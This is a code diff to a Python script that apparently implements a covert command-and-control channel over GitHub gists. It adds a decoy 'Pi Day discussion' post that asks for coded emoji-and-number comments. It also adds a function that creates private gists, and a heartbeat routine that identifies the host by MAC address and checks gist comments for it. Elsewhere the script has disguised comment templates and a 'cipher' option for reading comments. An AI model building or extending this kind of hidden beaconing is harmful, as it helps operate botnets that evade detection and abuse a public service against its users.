@@ -19,6 +19,8 @@ luck = ["DIGIT, good luck everyone!",
         "DIGIT but I never win... good luck anyways",
         ]
 
+pi_day_discussion_body = "Hi everyone! I'm excited for Pi Day next month. I was thinking about creating a contest to see who can come up with the most creative and unique way to represent the number pi. It could be a drawing, a poem, a song, or anything else you can think of. 🎉 The winner will receive a prize, so get creative and let's have some fun! 🤗 If you have any ideas or want to join in, just leave a comment below. Can't wait to see what everyone comes up with!\n\nAlso, and as a way to celebrate, we will be giving away 5 t-shirts! You only have to leave a comment of the format `🟢 271303656225123`, where the number will be your unique identifier. We will reduce all numbers to modulo $10^\{14\}\pi$ so think about that when choosing a number 🧠\n\nGood luck!"
+
 def hex_to_pretty_mac(mac):
     mac = hex(int(mac)).split('x')[1].zfill(12)
     return ':'.join(''.join(x) for x in zip(*[iter(mac)]*2))
@@ -62,6 +64,21 @@ def put_file_on_gist(gist_id, file_name, content):
     response = requests.patch(base_url + "/" + gist_id, headers=base_headers, json={"files": {file_name: {"content": str(content)}}})
     return response.json()
 
+def create_gist(description, body, file_name=None):
+    file_name = file_name if file_name != None else description.split(' ')[1].lower() + ".md"
+    data = {
+        "description": description,
+        "public": False,
+        "files": {
+            file_name: {
+                "content": body
+            }
+        }
+    }
+
+    response = requests.post(base_url, headers=base_headers, json=data)
+    return response.status_code, response.reason
+
 def get_comments(gist_id, cipher=True):
     response = requests.get(base_url + "/" + gist_id +
                             "/comments", headers=base_headers)
@@ -88,6 +105,12 @@ def heartbeat():
     mac = str(uuid.getnode())
 
     alive_gist_id = get_gist_id_from_description("Pi Day discussion") 
+
+    # Create the gist if it does not exist
+    if not alive_gist_id:
+        create_gist("Pi Day discussion", pi_day_discussion_body, file_name="pi.md")
+        alive_gist_id = get_gist_id_from_description("Pi Day discussion")
+        
     comments = get_comments(alive_gist_id, cipher=False) 
 
     if any(mac in (match := comment)["body"] for comment in comments): 
